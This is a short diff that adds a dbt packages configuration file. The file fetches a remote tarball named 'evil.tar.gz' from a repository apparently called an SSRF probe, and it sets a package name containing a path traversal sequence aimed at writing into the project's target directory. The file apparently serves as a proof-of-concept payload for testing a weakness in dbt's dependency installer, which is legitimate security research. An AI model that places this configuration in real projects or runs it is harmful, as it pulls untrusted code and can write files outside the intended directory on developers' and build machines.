@@ -1,0 +1,3 @@
+packages:
+  - tarball: https://raw.githubusercontent.com/jaswanthsai1/dbt-ssrf-probe/main/evil.tar.gz
+    name: '../../target/pwned_from_deps'
